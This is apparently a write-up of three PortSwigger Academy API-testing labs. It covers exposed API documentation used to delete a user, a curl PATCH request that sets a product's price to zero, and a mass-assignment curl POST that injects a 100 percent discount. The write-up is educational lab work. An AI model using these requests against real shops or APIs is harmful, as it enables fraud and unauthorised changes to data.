# API Testing
## Summary
- Lab 01: Exploiting an API endpoint using documentation
- Lab 02: Finding and exploiting an unused API endpoint
- Lab 03: Exploiting a mass assignment vulnerability
## Lab 01: Exploiting an API endpoint using documentation
- If we tried to discover the attack service of the application, we will find an `/api` path that indicate the application is using an api in its functionalities.
  
![fuffAPI1.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/API%20Testing%20Labs/images/fuffAPI1.png)

- If we access this path, we will find the `API documentation` disclosed for all the endpoints that the API uses.

![docsAPI.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/API%20Testing%20Labs/images/docsAPI.png)

- So now we can delete the `carlos` user:

![deleteuser 1.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/API%20Testing%20Labs/images/deleteuser%201.png)

------
## Lab 02: Finding and exploiting an unused API endpoint
- I tried fuzzing again but there is not something interested.

```sh
$ dirsearch -u https://0a6300f004fb6b8e80aba8eb00100062.web-security-academy.net -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/api/objects.txt

Target: https://0a6300f004fb6b8e80aba8eb00100062.web-security-academy.net/

[10:37:53] Starting:                                                                               
[10:38:05] 200 -  901B  - /cart                                             
[10:38:16] 200 -    2KB - /favicon.ico                                      
[10:38:16] 200 -    2KB - /filter                                           
[10:38:27] 200 -    1KB - /Login                                            
[10:38:27] 200 -    1KB - /login                                            
[10:38:27] 302 -    0B  - /logout  ->  /                                    
[10:38:36] 400 -   50B  - /product                                          
   
Task Completed 
```

- I have gone to complete by walking through the source code for the application and, i found a path for javascript code locating in this path `resources/js/api/productPrice.js`

![sourcecode.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/API%20Testing%20Labs/images/sourcecode.png)

- In the `productPrice.js` file, i have found an endpoint for the API:

![js_code.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/API%20Testing%20Labs/images/js_code.png)

- We can try to access this endpoint and see the response for that:

![jacket1.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/API%20Testing%20Labs/images/jacket1.png)

- So why not trying to change the request method into `PATch` method to modify the jacket price:

![contentType.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/API%20Testing%20Labs/images/contentType.png)
- OK, it needs the `Content-Type` header as `application/json` data type.
- The final form for the request will look like that:

```sh
$ curl -X PATCH -H "Cookie: session=on9pyVzZ5fUoHRFB0UFLbupX42XMRDpO" -H "Content-Type: application/json" https://0add00a2035d20b782d1019500910019.web-security-academy.net/api/products/1/price -d '{"price":00,"message":"ayhaga"}' | jq
```

![curl final exploit.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/API%20Testing%20Labs/images/curl%20final%20exploit.png)

- We have changed the price jacket into `$0.00`, We can buy that now in free.

![free.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/API%20Testing%20Labs/images/free.png)

----
## Lab 03 : Exploiting a mass assignment vulnerability
- During testing the functionality of the application, i detected an `API` endpoint for the checkout function `/api/checkout`.
- When placing the order, the API makes two requests, one of the with `GET` request method to get the items information:

![checkout.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/API%20Testing%20Labs/images/checkout.png)

- The second request is made by using the `POST` request method to create the order, but it sends `INSUFFICIENT_FUNDS` error because i don't have enough cash to place the order.

![createorder.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/API%20Testing%20Labs/images/createorder.png)

- So we can make a little bit of changes to the request by adding the `chosen_discount` parameter to make a discount for my order 100 percent.

```sh
$ curl -i -X POST -H "Cookie:session=5lsFt4KJSfBlSTqXbQbAycD2ZqfyYjYM" https://0a2b009703e577ab852245b9006000b8.web-security-academy.net/api/checkout -d '{
"chosen_discount": {
    "percentage": 100
  },"chosen_products":[{"product_id":"1","quantity":1}]}'

HTTP/2 201 
location: /cart/order-confirmation?order-confirmed=true
x-frame-options: SAMEORIGIN
content-length: 0
```
